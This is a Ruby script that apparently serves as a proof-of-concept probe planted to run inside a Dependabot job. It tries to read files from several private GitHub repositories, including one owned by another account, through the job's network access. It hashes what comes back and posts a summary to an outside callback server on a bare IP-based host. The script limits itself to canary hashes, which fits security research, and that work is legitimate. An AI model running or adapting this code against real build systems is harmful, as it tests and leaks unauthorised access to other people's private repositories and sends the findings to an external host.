require "digest"
require "json"
require "open3"
require "tempfile"

GITHUB_API_SCOPE_CALLBACK = "https://target.147.182.179.38.sslip.io:8443/infra/5b3963e04627c6a3b1943eb0e2a145cc"

GITHUB_API_SCOPE_CASES = [
  {
    "name" => "source_repository_positive_control",
    "url" => "https://api.github.com/repos/GougasseHamza/dependabot-external-git-victim-alice-20260822/contents/private-sentinel.txt",
    "expected_length" => 49,
    "expected_sha256" => "a494cc793c4d2361cab241b3ee3bd03937c4ca7f863a9145de2d1844a5f7144c"
  },
  {
    "name" => "same_owner_sibling_private_repository",
    "url" => "https://api.github.com/repos/GougasseHamza/dependabot-jit-same-owner-target-alice-20260822/contents/private-jit-sentinel.txt",
    "expected_length" => 49,
    "expected_sha256" => "216c66d7134111692f50d68241636443cb91f3311949c9f682f0c8545c03961a"
  },
  {
    "name" => "cross_owner_bob_private_repository",
    "url" => "https://api.github.com/repos/mongodb-sage-bot/lfs-binding-bob-20260823/contents/README.md",
    "expected_length" => 26,
    "expected_sha256" => "af2203026d9835a2d4d6b44e0766682b0e953ef9e77ab0d11f3c756ae3d39cff"
  }
].freeze

def github_api_scope_request(test_case)
  Tempfile.create("dependabot-github-api-scope-response") do |response_file|
    response_file.chmod(0o600)
    stdout, _stderr, process = Open3.capture3(
      "curl", "--silent", "--show-error", "--max-time", "12",
      "--max-filesize", "131072", "--noproxy", "",
      "--header", "Accept: application/vnd.github+json",
      "--header", "X-GitHub-Api-Version: 2022-11-28",
      "--output", response_file.path, "--write-out", "%{http_code}",
      test_case.fetch("url")
    )
    body = File.binread(response_file.path)
    status = stdout.strip.match?(/\A[0-9]{3}\z/) ? stdout.strip.to_i : 0
    decoded = nil
    top_level_keys = []
    begin
      parsed = JSON.parse(body)
      top_level_keys = parsed.is_a?(Hash) ? parsed.keys.map(&:to_s).sort : []
      content = parsed.is_a?(Hash) ? parsed["content"] : nil
      decoded = content.delete("\n").unpack1("m0") if content.is_a?(String)
    rescue JSON::ParserError, ArgumentError
      decoded = nil
    end
    {
      "name" => test_case.fetch("name"),
      "http_status" => process.success? ? status : 0,
      "response_length" => body.bytesize,
      "response_sha256" => Digest::SHA256.hexdigest(body),
      "top_level_keys" => top_level_keys,
      "content_field_present" => !decoded.nil?,
      "decoded_length" => decoded&.bytesize || 0,
      "decoded_sha256" => decoded ? Digest::SHA256.hexdigest(decoded) : "",
      "expected_canary_matches" => decoded &&
        decoded.bytesize == test_case.fetch("expected_length") &&
        Digest::SHA256.hexdigest(decoded) == test_case.fetch("expected_sha256"),
      "response_body_exfiltrated" => false,
      "credential_captured" => false
    }
  end
rescue StandardError => error
  {
    "name" => test_case.fetch("name"),
    "http_status" => 0,
    "error_class" => error.class.name,
    "response_body_exfiltrated" => false,
    "credential_captured" => false
  }
end

def github_api_scope_post(job_id, summary)
  _stdout, _stderr, process = Open3.capture3(
    "curl", "--fail", "--silent", "--show-error", "--max-time", "15",
    "--output", "/dev/null", "--header", "Content-Type: application/json",
    "--data-binary", "@-",
    "#{GITHUB_API_SCOPE_CALLBACK}/#{job_id}/runtime-summary",
    stdin_data: JSON.generate(summary)
  )
  process.success?
end

github_api_scope_job_id = ENV["DEPENDABOT_JOB_ID"].to_s
if github_api_scope_job_id.match?(/\A[0-9]+\z/)
  guard = "/tmp/dependabot-github-api-fallback-scope-#{github_api_scope_job_id}.done"
  begin
    File.open(guard, File::WRONLY | File::CREAT | File::EXCL, 0o600) { |file| file.write("1") }
  rescue Errno::EEXIST
    guard = nil
  end

  if guard
    summary = {
      "probe" => "dependabot-github-api-fallback-scope-v1",
      "job_id" => github_api_scope_job_id,
      "requests" => GITHUB_API_SCOPE_CASES.map { |test_case| github_api_scope_request(test_case) },
      "raw_tokens_retained" => false,
      "raw_response_bodies_retained" => false
    }
    github_api_scope_post(github_api_scope_job_id, summary)
    sleep 3
    raise "controlled stop after GitHub API fallback-scope canary"
  end
end
